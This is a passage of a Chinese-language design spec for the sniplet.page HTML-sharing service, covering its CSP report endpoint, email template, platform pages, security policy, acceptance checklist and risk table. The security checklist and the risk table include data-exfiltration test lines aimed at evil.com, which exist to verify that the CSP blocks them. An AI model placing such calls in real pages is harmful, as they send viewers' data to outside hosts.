**特殊性**:此 endpoint **MUST 匿名且無 Origin 限制**,因瀏覽器 CSP 自動寄送時:
- Origin header 常為 `null` 或 cross-origin(取決於瀏覽器版本)
- 無法帶任何認證
- 無法讓瀏覽器跑 preflight(CSP report 是 browser 內建機制)

**正因如此,本 endpoint 是 DoS 攻擊的高價值目標**。任何人可匿名 flood 偽 CSP report,燒光 Analytics Engine 免費額度(100k data points / day)、製造 `csp_violation` alert fatigue 掩護真攻擊。v0.8.15 F-40 加三層量級保護:

**Request 限制(F-40,v0.8.15 加)**:

1. **Content-Type 白名單**:`application/csp-report` OR `application/json` → 不符 `400 invalid_content_type`
2. **Body 大小上限**:`8192 bytes`(超過 `413 payload_too_large`);典型合法 CSP report ~500 bytes,8KB 已很寬裕
3. **Per-IP rate limit**:`rl_csp:<HMAC-SHA256(IP_HASH_SECRET, normalized_ip)>:<YYYY-MM-DD-HH-MM>`(minute bucket),每 IP 每分鐘上限 **100 筆**;超過 `429 rate_limited` 且寫 `csp_report_rate_limited { ip_hash }` event
4. **Body schema 粗驗**:JSON 必須 parseable 且含 `csp-report.blocked-uri` 或 `csp-report.blocked_host`(兩種 schema 版本);不符 `400 invalid_format` 即丟棄

**Response**:
- 成功:`204 No Content`(不 return body,不 cache)
- Error:走 §16 通用 error JSON 格式

**Errors**:

| HTTP | Error code | 觸發條件 |
|---|---|---|
| 400 | `invalid_content_type` | CT 非 `application/csp-report` 也非 `application/json` |
| 400 | `invalid_format` | Body 非 CSP report 結構 |
| 413 | `payload_too_large` | Body > 8192 bytes |
| 429 | `rate_limited` | 單 IP 當分鐘超過 100 筆 |

**ip_hash 與 `/auth/request` 共用 `IP_HASH_SECRET`**:一致的 HMAC 讓 ops 在 analytics 裡可以 correlate 同 IP 的其他活動(例如:同 ip_hash 是否也在 `sniplet_404_miss` 高發)。

**為何不用 Turnstile**:瀏覽器 CSP 內建 report 機制無法執行 JS / 過 widget;Turnstile 在此 endpoint 無意義。

**Bypass 分析**:攻擊者可旋轉 IP,但每 IP 100/min 已把單 IP 吃爆 Analytics 配額的能力限制在 100×60×24 = 144k/day 單 IP,遠低於全站配額;真 botnet 若仍衝破,最後一層防線是 Analytics Engine 本身的 write rate limit + CF Bot Fight Mode。接受此殘餘風險。

## 9. Email Template 規格

**主旨**(通用版,不含 slug 名稱):`Sign in to sniplet.page`

**純文字版**:
```
Someone shared a sniplet with you on sniplet.page.

View it here:
{verify_url}

This link expires in 15 minutes and can only be used once.
If you didn't request this, safely ignore this email.

— sniplet.page
```

**HTML 版**(B「乾淨有品」):
- 系統字、最大寬度 560px、居中
- 純文字 logo 在頂部
- 一段說明文字 + button style `<a>`
- 分隔線 + 15 分鐘 + one-time use 說明 + 忽略提示
- 底部 footer 小字「sniplet.page」
- 無 logo 圖檔、無 unsubscribe(transactional 不需要)、無 dark mode(v2)
- **不提 slug 名稱**(信件可能被轉寄、截圖)

## 10. Platform Pages(平台產的頁面總覽)

本節定義所有由平台 Worker 產生的頁面。Creator 上傳的 sniplet HTML 不在此範圍(那是 creator 的內容,平台只加 security headers)。

### 10.1 總覽

平台產 6 類頁面。三個私享流程會遇到,一個是產品入口,兩個是公開的 security policy。

| 頁面 | URL | 觸發 | Turnstile | 詳述 |
|---|---|---|---|---|
| **Apex root** | `sniplet.page/` 與 `sniplet.page/SKILL.md` | GET,**永遠回 SKILL.md text/plain**(v0.8.13 取消 Accept 分流) | ❌ | §10.2 |
| **Challenge page** | `{slug}.sniplet.page/` | 私享 sniplet + 未通過授權 | ✅ | §10.3 |
| **確認頁(verify page)** | `sniplet.page/auth/verify?t=...&r=...` | Viewer 點 email 中的連結 | ❌ | §10.4 |
| **404 page** | 多處 | 不存在 / 過期 sniplet | ❌ | §10.5 |
| **Security policy** | `sniplet.page/security` | 安全研究者 | ❌ | §10.7 |
| **security.txt** | `sniplet.page/.well-known/security.txt` | 自動化工具(RFC 9116) | ❌ | §10.8 |

**Turnstile 決策邏輯**:

- **Challenge page 要 Turnstile**:擋 `/auth/request` 濫用(暴力 email 嘗試、打爆 Resend、email enumeration timing attack)。這是對匿名 POST 的合理防護。
- **確認頁不要 Turnstile**:`/auth/consume` 已有多層防護 — attacker 必須先持有 valid magic JWT(只寄給白名單 email)、token 15 分鐘過期、one-shot(`MAGIC_CONSUMED_KV` 擋 replay)、session cookie 各 sniplet 白名單獨立判斷。再加 Turnstile 只增加 UX 摩擦,零安全收益。

**共同屬性**:
- 所有平台頁面皆回 `Cache-Control: no-store`
- 所有平台頁面加統一 security headers(§7.19)— 但 **CSP 略有不同**:Challenge page 與確認頁需要額外允許 Turnstile 的 domain(`https://challenges.cloudflare.com`);sniplet page serve creator HTML 用主 CSP
- 系統字、RWD、v1 僅英文,v2 加中文
- 不含品牌 logo 圖檔、社群連結、廣告、追蹤

### 10.2 Apex root(`sniplet.page/` 與 `sniplet.page/SKILL.md`)

**目的**:AI agent 的 skill 取得點。**v0.8.13 取消 Accept 分流**:無論 Accept 為何,一律回傳 SKILL.md 原文。

**設計理由**:sniplet.page 的本質是「AI agent 的 share button」,不是 SaaS landing。Apex 不假裝是產品首頁,直接呈現 contract(SKILL.md)是與 product thesis 對齊的最小設計。第一次到訪的人類肉眼可讀(monospace),也可右鍵 save as / `curl -O` 取得;agent 無需學「該打哪個 endpoint 拿 skill」,直接打 root。

**Response**:
```
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Content-Disposition: inline; filename="SKILL.md"
Cache-Control: public, max-age=3600
{SKILL.md raw content,含 frontmatter}
```

**兩個別名同樣 response**:
- `GET /` — short URL,人/agent 第一直覺打的 URL
- `GET /SKILL.md` — 與 `curl -O https://sniplet.page/SKILL.md` 自然搭配(`-O` 從 URL path 取檔名)

兩者 Worker handler 共用同一份 SKILL.md 字串(內嵌於 Worker bundle build time);一筆改動兩處生效。

**Known Issues / Advisories**:**v0.8.13 移除 apex 的 advisory 區塊**。SEV 事件公告改至 `sniplet.page/security#advisories` 段落(§10.7);若 SKILL.md 因 incident 需臨時加 inline warning,operator 可在 SKILL.md 頂部 frontmatter 之後插一段 `> ⚠ Advisory: ...`,deploy 後立刻生效於 apex。

**Search engine 與爬蟲行為**:不刻意做 SEO;crawler 拿到 text/plain SKILL.md,搜尋結果 snippet 約是「`# sniplet.page — share HTML as a URL`」(SKILL.md 第一行)。可接受。

### 10.3 Challenge page

**觸發**:GET `{slug}.sniplet.page/` 且 `meta.viewers ≠ null`,且:無 cookie / cookie 無效 / cookie 的 `sub`(HMAC)不在 `meta.viewers[].h` 白名單。

**HTTP 行為**:回 `200 OK` + HTML(**不**回 401 / 403 — HTTP status 不區分 access mode,避免透過 status code 洩漏 sniplet 私享性質)

**Known limitation**:雖然回 200,challenge page 文案「This sniplet is private」本身即揭示此 sniplet 為私享。Attacker 枚舉可區分三態(回公開 HTML / 回 challenge page / 回 404)。真正 unified 需讓公開 sniplet 也走 "click to view" interstitial(UX 倒退,不划算)。v1 接受此 trade-off;真正敏感的 sniplet slug 應避免語義化命名。**永遠加 postfix 本身已部分 mitigation**(attacker 不能精準搜尋 brand-named slug)。

**UI 元素**:
- 純文字品牌:`sniplet.page`
- 標題:`This sniplet is private`
- 說明:`Enter your email to request access.`
- Email input(required,type=email)
- Cloudflare Turnstile widget
- Submit button:`Send magic link`
- 提示:`A magic link will be sent if you're on the viewer list. Click the link, then Continue to view.`
- 底部 footer:`This sniplet expires in N days`(倒數 TTL 剩餘,server-side 計算)

**提交行為**:Inline JS → cross-origin `fetch POST https://sniplet.page/auth/request` with `credentials: 'include'` + `Content-Type: application/json`,body 含 `{ email, return_to, turnstile_token }`。依 response 切 UI:
- 200 → `If this email is authorized, a magic link has been sent. Check your inbox.`
- 400 `turnstile_failed` → `Please complete the verification and try again.`
- 429 `rate_limited` → `Too many attempts. Please try again later.`
- 503 `service_unavailable` → `Service is temporarily busy. Please try again in a few minutes.`(F-32)

**CSP 例外**:此頁面的 CSP 需額外允許 `script-src https://challenges.cloudflare.com`(Turnstile widget JS)與 `frame-src https://challenges.cloudflare.com`(Turnstile iframe)。

**樣式**:系統字、最大寬度 420px、居中、灰底白卡、RWD 手機優先。

### 10.4 確認頁(verify page)

**觸發**:GET `sniplet.page/auth/verify?t=<magic-jwt>`,由 viewer 點 email 中的連結觸發。

**URL 中的 `r` query param 已於 v0.8.14 移除**(F-36):`return_to` 從始至終由 JWT claim 承載,email 連結只需 `?t=<jwt>`,比舊設計短且消除 URL tampering 面。若舊連結仍含 `&r=...`,server 忽略該 param。

**HTTP 行為**:永遠回 `200 OK` + HTML。**此頁面的 Worker handler 不驗證 token、不 consume、不 set cookie**,純粹顯示。

**為何兩段式**:防止 email security scanner(Microsoft Defender Safe Links、Google Workspace、某些企業 email gateway)在 email 到達收件匣前 / click 前自動 GET URL 做安全檢查時意外 consume 掉 token。Scanner 看到 HTML 確認頁就結束,不會模擬「使用者點 button」這個互動 → POST `/auth/consume` 不會被觸發。

**UI 元素**:
- 純文字品牌:`sniplet.page`
- 標題:`Continue to view your sniplet`
- 說明:`You're about to sign in to sniplet.page.`
- Continue button
- 小字提示:`This link expires in 15 minutes and can only be used once.`
- **不顯示** sniplet slug 名稱 / return_to URL 明文(避免社交工程時被 screenshot 利用)

**提交行為**:Inline JS 從 URL query 讀出 `t`(不放 DOM,用 closure),button click → `fetch POST /auth/consume` with `credentials: 'include'`、`Content-Type: application/json`,body 只含 `{ "t": "<magic-jwt>" }`(v0.8.14 F-36 簡化)。依 response:
- 200 `{ redirect }` → `window.location = redirect`
- 400 `invalid_content_type` / `invalid_origin` → 顯示「瀏覽器環境異常,請直接從 email 連結開啟」(極罕見)
- 401 `invalid_token` / 410 `token_expired` / 422 `already_consumed` → 顯示對應錯誤訊息,提示使用者重新申請(回 challenge page)

**無 Turnstile**:見 §10.1 決策說明。

**CSP**:此頁面不需要外部 script CDN,可用最嚴 CSP(只 `'unsafe-inline'` 給自己的 inline script)。

**樣式**:系統字、最大寬度 420px、居中、灰底白卡,視覺上與 challenge page 同風格,降低 Alice 的認知負擔。

### 10.5 404 page

**觸發**:
- GET `{slug}.sniplet.page/` 但 slug 在 R2 找不到 / 已過期(§7.21)
- Apex 上打到 reserved path 但無 handler
- API 上打到未定義 endpoint(API 404 回 JSON,不是 HTML)

**HTTP 行為**:`404 Not Found` + HTML

**UI 元素**:
- 純文字品牌:`sniplet.page`
- 標題:`Not found`
- 說明:`This sniplet doesn't exist, or it has expired.`
- 連回 `sniplet.page/` 的 link

**為何過期也是 404(非 410)**:見 §7.21 / F-9。避免 attacker 透過 `404 vs 410` 區分「slug 從未存在」vs「slug 曾存在但過期」— 讓 slug 枚舉攻擊拿不到任何訊號。

**CSP**:最嚴 CSP(無外部依賴)。

### 10.6 錯誤頁與 flash message 風格

所有錯誤訊息走 **inline 顯示**(在 button / form 旁邊),不跳 alert / modal。
統一口吻:**簡潔、不責備、可行動**。

- Bad: `Error 401: Invalid token`
- Good: `This link is no longer valid. Please request a new magic link.`

Operator 可 Slack / GitHub 回報文案 bug。

### 10.7 Security policy(`sniplet.page/security`)

**目的**:公開安全政策,給研究者與自動化工具尋找的回報入口。即使 sniplet.page 的 code 非 open source,public service 仍需要透明的漏洞回報管道。apex root 頁面會連到這裡。

**HTTP 行為**:`GET /security` → `200 text/html`,`Cache-Control: public, max-age=3600`(這頁更新頻率低,可 cache)

**UI 元素(英文)**:

- 純文字品牌 `sniplet.page`
- 標題:**Security Policy**
- 簡介(約一段):`sniplet.page takes security seriously. This page describes how to report vulnerabilities and what we consider in scope.`
- **Reporting a vulnerability**:
  - Email:`security@sniplet.page`
  - 嚴重問題在主旨加 `URGENT`
  - 目標 72 小時內回覆
  - 請包含:issue 描述、reproduce 步驟 / PoC、預期影響、建議 mitigation
  - 請勿在我們修復前公開揭露;我們會協調 disclosure 時程
- **Scope**:
  - In scope:`sniplet.page`、`api.sniplet.page`、所有 `*.sniplet.page`、sniplet 後端(auth、access control、rate limiting、資料處理)、sniplet skill(SKILL.md,frontmatter `sniplet-page-share`)— 若洩漏 secrets 或促成攻擊、公開 code(若有發佈)、**`owner_token` 透過 CF edge log pipeline 外洩(SEV-1)**
  - Out of scope:user 自上傳的 HTML 內容(設計上允許任意 HTML;但**cross-sniplet exfiltration 在 scope 內**,即使 SOP 應能擋下)、第三方服務(Cloudflare、Resend、Turnstile)、ordinary traffic DoS(CF 邊緣處理)、social engineering、physical security、受害者裝置已 compromise 的攻擊、Turnstile CAPTCHA bypass
- **What we consider a vulnerability(列點)**:Cross-sniplet data leakage、Authentication bypass、Email whitelist enumeration、IP / email de-anonymization、Account takeover via magic link、Magic link consumption by email scanners、Owner token compromise、Open redirect、XSS in platform-generated pages、CSP bypass、Cryptographic weaknesses
- **Disclosure timeline expectations**:
  - 72 小時:acknowledgement
  - 14 天:初步 assessment + severity 分類
  - 90 天:default maximum time to fix
  - Public disclosure:協調後揭露;若研究者同意,於 GitHub release notes 致謝
- **Safe harbor**:對 good-faith 遵守本政策的研究者不追訴。須遵循:不存取 / 修改超過 demonstrate 漏洞所需的資料、不在修復前公開、不干擾其他使用者
- **Advisories**(`#advisories` anchor;v0.8.13 加,取代原 GitHub README Known Issues 段落):
  - SEV 事件公告寫在此處(operator 手動 edit Worker assets,deploy 後生效)
  - 平時為空段落或最近一條 advisory(含日期、嚴重度、影響範圍、處置狀態、後續更新時間)
  - 已 resolved 的 advisory 保留 30 天後可移至 changelog
  - 此段落是 v1 對外溝通 incident 的唯一公開 channel(GitHub repo 為 private,無法走 README)

**CSP**:最嚴 CSP(無外部依賴),與 §10.5 404 page 相同。
**樣式**:系統字、最大寬度 720px、左右留白;排版以易讀為主。

### 10.8 security.txt(`sniplet.page/.well-known/security.txt`)

**目的**:RFC 9116 標準,供自動化工具(bug bounty scanner、researcher tooling)發現安全回報窗口。

**HTTP 行為**:`GET /.well-known/security.txt` → `200 text/plain`,`Cache-Control: public, max-age=86400`

**內容(純文字)**:

```
Contact: mailto:security@sniplet.page
Expires: 2027-04-21T00:00:00Z
Preferred-Languages: en, zh-TW
Canonical: https://sniplet.page/.well-known/security.txt
Policy: https://sniplet.page/security
```

**`Expires`**:RFC 9116 要求未來日期;RUNBOOK §5 每季檢查項目須包含「更新 security.txt 的 Expires 至少領先 1 年」。

**注意**:此檔內容無敏感資訊,無需 signed(`.asc` 版本)— v1 接受;若未來接收大量 automated report,再評估 PGP signing。

## 11. 成功指標(MVP 驗收 checklist)

### 功能面
- [ ] `api.sniplet.page` live、HTTPS OK
- [ ] **Wildcard DNS + SSL**:任意 `{slug}.sniplet.page` 可解析並提供 HTTPS
- [ ] `{slug}.sniplet.page/` 公開路由正常 + security headers 正確
- [ ] `sniplet.page/` 與 `sniplet.page/SKILL.md` **永遠**回 text/plain SKILL.md(curl、browser、Accept: text/html、Accept: application/json 全部一致)
- [ ] **永遠 postfix**:POST slug `q3-sales` → response slug 含 `-{4 chars}`
- [ ] Slug 撞 reserved subdomain → 400
- [ ] 私享 flow 端到端:POST → challenge → Turnstile → magic link → `/auth/verify` 確認頁 → `/auth/consume` → cookie → serve
- [ ] **Cookie scope**:Set-Cookie 含 `Domain=sniplet.page`,browser devtools 確認 cookie 會送到多個 subdomain
- [ ] **跨 sniplet session 重用**:Alice 驗過 sniplet A,去 sniplet B(Alice 在 B 的 viewers 白名單)→ 直接 serve,不走 magic link
- [ ] Strategy C 驗證:未授權 email 提交 → 回 200 但不收信
- [ ] PATCH viewers 跨 mode:public → add → email-gated;email-gated → remove 全部 → public
- [ ] DELETE 後立刻 GET 應回 404
- [ ] Email index:新建 gated sniplet 後,`/auth/request` 能查到 email
- [ ] Analytics Engine:至少 1 筆 event 寫入成功
- [ ] HTML > 1MB → 400 invalid_format
- [ ] Bot Fight Mode 在 dashboard 已啟用
- [ ] SKILL.md 透過 `curl https://sniplet.page/` 與 `curl -O https://sniplet.page/SKILL.md` 皆能取得;後者本機檔名為 `SKILL.md`;response 含 `Content-Disposition: inline; filename="SKILL.md"`
- [ ] Claude.ai + Claude Code 實測 happy path 通
- [ ] 至少一筆 public + 一筆 gated 實測通過
- [ ] `POST /auth/logout` 清 cookie 生效(確認帶 Domain=sniplet.page)
- [ ] **`POST /auth/logout` CSRF 防護(S-6)**:curl 不帶 Origin 或帶 `Origin: https://evil.com` → 400 `invalid_origin`;`Origin: https://sniplet.page` → 200
- [ ] **UX 實測:`{slug}.sniplet.page` URL 在 LINE / Slack / WhatsApp / iMessage 可 auto-link**(v0.8.10 新增)

### 安全面
- [ ] **P0 SOP cross-sniplet isolation**:建 sniplet A 塞 JS `fetch('https://other-sniplet-xxx.sniplet.page/')` → response 被 browser SOP 擋(無 CORS → opaque response)
- [ ] **P0 Subdomain origin 隔離**:A 的 JS `window.open('https://other-sniplet-xxx.sniplet.page/')` → `w.document` throw DOMException
- [ ] **P0 CSP enforced**:sniplet HTML 塞 `fetch('https://evil.com/')` → 被 CSP `connect-src 'none'` 擋;`new Image().src = 'https://evil.com/?' + data` → 被 `img-src` 擋(non-data URI)
- [ ] **P0 CSP allowlist**:sniplet 載 `<script src="https://cdnjs.cloudflare.com/...">` 與 `<script src="https://cdn.tailwindcss.com">` 可正常執行;載 `https://cdn.jsdelivr.net/...` / `https://unpkg.com/...` / 任何其他 CDN → 被擋;Tailwind utility class(`<div class="flex items-center">`)能即時產生樣式
- [ ] **P0 Magic link one-shot**:`/auth/consume` 同一 token 送第二次 → 422 `already_consumed`
- [ ] **P0 Email scanner 模擬**:curl `GET /auth/verify?t=<valid-token>&r=...` → 回 HTML 確認頁,token 仍可後續被 `/auth/consume` 消耗一次
- [ ] **P0 IP HMAC**:`IP_HASH_SECRET` 已設;KV key 格式為 `ip_quota:<hmac>:<date>`;meta.json `ip_hash` 為 HMAC 輸出
- [ ] **P0 Cookie Domain=sniplet.page**:`Set-Cookie` 的 session cookie **有** `Domain=sniplet.page`(與 v0.8.9 的 host-only 相反);`/auth/logout` 亦有
- [ ] **P0 /auth/request timing**:實測 hit 與 miss path response latency 差 **< 20ms**(curl + timing loop 各 100 次,取中位數;設計目標為 < 5ms,此 20ms 是容忍 CF PoP 差異的測試 SLO,見 §7.10 / §7.17)
- [ ] **P0 /auth/request per-IP**:同 /64 源 31 次 `/auth/request` → 第 31 次回 429
- [ ] **P0 CSP violation reporting**:CSP 違規時 `/v1/csp-report` 收到,Analytics Engine 有 `csp_violation` event
- [ ] **P1 JWT purpose**:用 magic link token 當 session cookie → 拒絕
- [ ] **P1 return_to 驗證**:magic JWT 含 `return_to="https://evil.com/"`(人造測試)→ `/auth/consume` redirect 設為 `https://sniplet.page/`,不是 evil.com
- [ ] **P1 return_to 驗證**:magic JWT 含 `return_to="https://q3-xxx.sniplet.page/?xss=<script>"` → 拒絕(含 query)
- [ ] **P0 /auth/consume Origin CSRF(F-35,v0.8.14)**:從 `evil-x9k2.sniplet.page` 的 JS fetch `/auth/consume`(Origin 非 apex)+ `Content-Type: text/plain` + 附攻擊者 magic token → 回 `400 invalid_content_type` 或 `400 invalid_origin`;不 set cookie;Alice 的 session 不被攻擊者 token 覆寫
- [ ] **P0 /auth/consume body `r` 不被信任(F-36,v0.8.14)**:手工對 `/auth/consume` 送 `{ t: <valid-jwt>, r: "https://evil-sniplet.sniplet.page/" }`,JWT 內 `return_to` 為 `https://legit.sniplet.page/` → response `redirect` 必為 JWT 內值(legit),body `r` 被完全忽略
- [ ] **P1 Content-Type enforcement(F-37,v0.8.14)**:對 `/v1/sniplets`、`/v1/sniplets/:slug/viewers`(PATCH)、`/auth/request`、`/auth/consume` 送 `Content-Type: application/x-www-form-urlencoded` 或 `text/plain` → 全數回 `400 invalid_content_type`;`/v1/csp-report` 需同時接受 `application/csp-report` 與 `application/json`
- [ ] **P1 Email 正規化**:`Alice@CO.com` 與 `alice@co.com` 查詢命中同筆 KV
- [ ] **P1 Per-IP sniplet rate limit**:同 IP 連建 51 個 sniplets → 第 51 個回 429
- [ ] **P1 Email HMAC salt**:`EMAIL_HASH_SECRET` 已設且 KV key 格式為 `viewer:<hmac>`
- [ ] **P0 meta.viewers HMAC 儲存(F-11)**:POST 後檢查 R2 meta.json,`viewers` 為 `[{h, m}]` 結構,無明文 email;PATCH add/remove 接受明文但 server HMAC 比對後更新;response 只回 `viewers_masked`
- [ ] **P0 JWT sub HMAC(F-11)**:實測 cookie decode 後 `sub` 欄位為 HMAC-SHA256 hex / base64,不是明文 email;跨 sniplet session 重用測試時,server 以 HMAC 比對 `meta.viewers[].h`
- [ ] **P1 IPv6 /64 normalize**:同 /64 但不同 /128 的 51 個 IPv6 連測 → 第 51 次回 429
- [ ] **P1 JWT secret 拆分**:`SESSION_JWT_SECRET` 與 `MAGIC_JWT_SECRET` 為不同值;用 magic secret 簽的 token 拿去當 session 驗證 → 拒絕
- [ ] **P1 JWT HS256 enforce**:library 設定 enforce `HS256`;`alg: "none"` / asymmetric token 會被 reject
- [ ] **P1 Resend alert**:Analytics Engine 有 `resend_send_failed` event schema;dashboard alert 閾值已設
- [ ] **P1 owner_token constant-time**:code review 確認 token 比對使用 `node:crypto` 的 `timingSafeEqual` 或等效手寫 constant-time loop;**禁用** `===` / `==` / `Buffer.compare`。**註**:`crypto.subtle.timingSafeEqual` 不存在於 Web Crypto,不可使用
- [ ] **P1 CF Log Push hygiene**:ops 確認 CF Log Push 未啟用,或 `Authorization` header 在 drop list
- [ ] **P2 Cron alert**:Analytics Engine 有 `cron_cleanup_success` event;dashboard 有「24hr 無 event → alert」
- [ ] **P2 DNSSEC + CAA**:`dig +short DS sniplet.page` 有回傳;`dig CAA sniplet.page` 有回傳
- [ ] **P2 Doc**:`RUNBOOK.md` 已在 ops repo 根目錄;`/security` page + `/.well-known/security.txt` 已 live 且 `security.txt` 的 `Expires` 領先至少 1 年
- [ ] **P2 Slug postfix random**:code review 確認用 `crypto.getRandomValues()`,非 counter / timestamp
- [ ] **P2 meta.json 無 `ua`**:POST 後檢查 R2 meta.json,無 `ua` 欄位
- [ ] **P2 SW registration 擋下**:手動測試 `navigator.serviceWorker.register('/')` 應失敗(MIME check)
- [ ] **P2 Rate limit window 類型**:code review 確認 per-IP 走 fixed UTC day、per-email hour 走 fixed hour bucket
- [ ] **P2 Logging hygiene**:檢查 Worker logs 與 Analytics Engine,無 owner_token、JWT、明文 email、IP、CSP blocked-uri 明文
- [ ] **P1 `/auth/request` 全站 cap(F-32)**:模擬 101 次合法 hit(跨多個 IP / email 拆散 per-email 與 per-IP rate limit)→ 第 101 次回 503 `service_unavailable`;Analytics 有 `auth_global_cap_hit` event
- [ ] **P0 Permissions-Policy 生效(F-38,v0.8.14)**:sniplet HTML 嘗試 `navigator.geolocation.getCurrentPosition(...)` → 直接 reject(不彈 permission prompt);`navigator.mediaDevices.getUserMedia({video:true})` → NotAllowedError;`PaymentRequest(...)` 建構即失敗;DevTools Network response header 含完整 `Permissions-Policy` header
- [ ] **P1 Owner 操作 slug enumeration(F-33)**:`DELETE /v1/sniplets/<nonexistent-slug>` with any token → 401 `invalid_token`;response 與「existing slug + wrong token」的 401 完全相同(包含 latency < 5ms 差距)
- [ ] **P1 R2 create-only(F-34)**:code review 確認 `SNIPLETS.put` 使用 `onlyIf: { etagDoesNotMatch: '*' }`;unit test 模擬 `PreconditionFailed` 可正確觸發 postfix retry
- [ ] **P2 DMARC(F-39,v0.8.14)**:`dig TXT _dmarc.sniplet.page` 含 `v=DMARC1; p=reject; adkim=s; aspf=s; rua=mailto:security@sniplet.page`;ship 前已觀察 `rua` 報表 ≥ 7 天無合法信誤判
- [ ] **P2 Slug 404 enumeration 監控(F-42,v0.8.15)**:`GET {slug}.sniplet.page/` 打到不存在 slug → Analytics 寫 `sniplet_404_miss { ip_hash }`;dashboard 設「單一 ip_hash > 200/hour」alert
- [ ] **P1 Owner mutation audit log(F-41,v0.8.15)**:DELETE / PATCH viewers 成功後 Analytics 寫 `sniplet_mutated { action, slug_hash }`;owner_token 洩漏時可從 Analytics 查異常 spike
- [ ] **P2 csp-report rate limit(F-40,v0.8.15)**:單 IP > 100/min 到 `/v1/csp-report` → 回 429 並寫 `csp_report_rate_limited { ip_hash }`;body > 8KB → 413;Content-Type 非 `application/csp-report` / `application/json` → 400 `invalid_content_type`

## 12. 關鍵風險

| # | 風險 | Mitigation |
|---|------|-----------|
| 1 | Phishing / spam 跳板 | 7 天 TTL、CF 邊緣 WAF、Turnstile、rate limit、**永遠 postfix** 防品牌挪用、**CSP `form-action 'none'`** 擋 phishing 表單 |
| 2 | Cloudflare / Resend 爆量費用 | 每日 1000 sniplets hard cap、per-IP 50/day、Resend 3000 封免費 |
| 3 | Anthropic/OpenAI 自己做 public URL | 跨 agent 通用 + 私享是差異化護城河 |
| 4 | Skill 在某些 harness 不穩 | MVP 只保證 Claude.ai + Claude Code |
| 5 | **Subdomain URL 在某些 messaging app auto-link 失敗** | v0.8.10 ship 前實測 LINE/Slack/WhatsApp/iMessage;若有 app 失敗則需於 SKILL.md 提示使用者補 `https://` |
| 6 | ~~跨 sniplet 洩漏(same-origin credential-bearing fetch)~~ | **subdomain-per-sniplet 架構 + SOP 天然解決**(v0.8.10 整組移除 Fetch Metadata / COOP) |
| 7 | Magic link 被攔截 / 重放 | 15 分鐘短期 + HTTPS only + **one-shot token via MAGIC_CONSUMED_KV** + 強制 `purpose === "magic"`。**Replay 風險 v1 已解**(one-shot) |
| 8 | 合法 email 被濫發騷擾 / DoS viewer quota | Turnstile + per-email rate limit + **per-IP rate limit 30/day on `/auth/request`**(v0.8.10 加) |
| 9 | Email enumeration | Strategy C |
| 10 | 移除 viewer 後 session 仍有效 | 下次 GET 時 server 比對會擋;v2 做 revoke list |
| 11 | 開發環境網路中斷 / vendor dashboard 臨時無法存取 | 重要 setup 在 implementation 前先完成 |
| 12 | ~~Cache invalidation 遺漏~~ | **v0.8.10 移除 edge cache,此風險消失** |
| 13 | EMAIL_INDEX_KV 一致性延遲 | KV eventually consistent,極罕見漏發 magic link 可接受 |
| 14 | iframe 嵌入汙染品牌 | `X-Frame-Options: DENY` + CSP `frame-ancestors 'none'`;subdomain 讓 iframe 目標更難猜 |
| 15 | JWT secret 洩漏 | `v` 欄位預留 rotation;logging hygiene(§7.22)避免 secret 入 log |
| 16 | Open redirect via `return_to` | §8 嚴格驗證邏輯(hostname 白名單、拒 query/fragment) |
| 17 | `owner_token` timing attack | Constant-time 比對(§7.14) |
| 18 | Email index 被 rainbow table 還原 | HMAC-SHA256 with `EMAIL_HASH_SECRET`(§7.10) |
| 19 | Single IP 吃光 daily cap | Per-IP 50 sniplets/day(§7.17) |
| 20 | ~~Viewer email 以明文存於 R2 meta.json~~ | **v0.8.11 F-11 升 v1**:`meta.viewers[]` 改存 `{ h: HMAC, m: masked }`;R2 外洩只 leak first-char + domain,不 leak 完整 email |
| 21 | HTML 內容以明文存於 R2(CF at-rest 加密對 CF operator 透明) | 接受 for v1;Privacy Policy 明示;v3+ 評估 E2E encryption |
| 22 | **Magic link token 在 URL query,會留 browser history / bookmark / clipboard;含 cloud-sync 放大效應** | **one-shot token 已根本解**(v0.8.10);即使 token 外洩,15 分鐘內若已被合法 viewer consume 則 replay 失敗 |
| 23 | Per-IP rate limit 可被並發繞過(KV eventually consistent) | Daily cap 1000 兜底;v2 升 CF Rate Limiting Rules |
| 24 | 404 vs 410 洩漏「slug 曾存在過」 | 統一改為 404(§7.21)— 永遠 postfix 進一步降低此 signal 價值 |
| 25 | Challenge page 文案揭示「此 sniplet 私享」 | v1 接受;postfix 讓 slug 無法被精準預測,部分 mitigation |
| 26 | Resend 靜默失敗導致合法 viewer 收不到信 | Analytics `resend_send_failed` + ops alert |
| 27 | Cron 失敗導致過期 sniplet 未清 | Analytics `cron_cleanup_success` + 24hr 無 event → alert |
| 28 | ~~Session cookie Domain 擴及未來子網域~~ | **v0.8.10 主動 `Domain=sniplet.page`** 讓 cookie 跨 sniplet 共享是 feature,不是風險;SOP 保證內容隔離 |
| 29 | IP hash 可被離線窮舉(IPv4 僅 2³²) | HMAC-SHA256 with `IP_HASH_SECRET` |
| 30 | `/auth/request` timing 洩漏 email 白名單 | `ctx.waitUntil()` defer Resend,兩 path latency 差 < 5ms |
| 31 | JWT secret 共用時 purpose 檢查漏抓 = session 偽造 | `SESSION_JWT_SECRET` / `MAGIC_JWT_SECRET` 拆分,purpose 檢查為第二層 |
| 32 | Secret 洩漏無 rotation runbook | `RUNBOOK.md` 完整 secret rotation flow(含 EMAIL_HASH_SECRET 的 dual-write migration) |
| 33 | Incident response / GDPR breach 通知無流程 | `/security` page(§10.7)含回報窗口 + safe harbor;GDPR Art 17 erasure v1 依 7 天 TTL 兜底,v2 ship Privacy Policy 時另開窗口 |
| 34 | ~~`window.open` 繞過 Fetch Metadata 讀私享 sniplet~~ | **subdomain 架構下 cross-origin window.open 被 SOP 擋,不需要 COOP**(v0.8.10) |
| 35 | IPv6 attacker 在 /64 空間旋轉 source address 繞過 per-IP quota | per-IP KV key 先 normalize /64 再 HMAC |
| 36 | ~~Edge cache stale window~~ | **v0.8.10 移除 edge cache,此風險消失** |
| 37 | ~~localStorage / IndexedDB 跨 sniplet 共用~~ | **subdomain 架構下每個 sniplet 自己的 storage origin**(v0.8.10) |
| 38 | **CSP 不擋 navigation exfil**(`location = evil + '?' + data`) | v1 接受;需要 viewer 主動點擊離開頁面,attack value 低、有社交工程 friction |
| 39 | **CDN supply chain**(cdnjs 或 cdn.tailwindcss.com 被 compromise) | 接受此風險;v0.8.14 後 allowlist 為 cdnjs + tailwindcss 兩處單點。若任一 CDN 出現 incident,緊急更新 CSP 移除該來源並觀察 `csp_violation` rate;最壞情境全部移除改純 `'unsafe-inline'`,creator 需暫改 inline lib / 放棄 Tailwind Play,代價明確 |
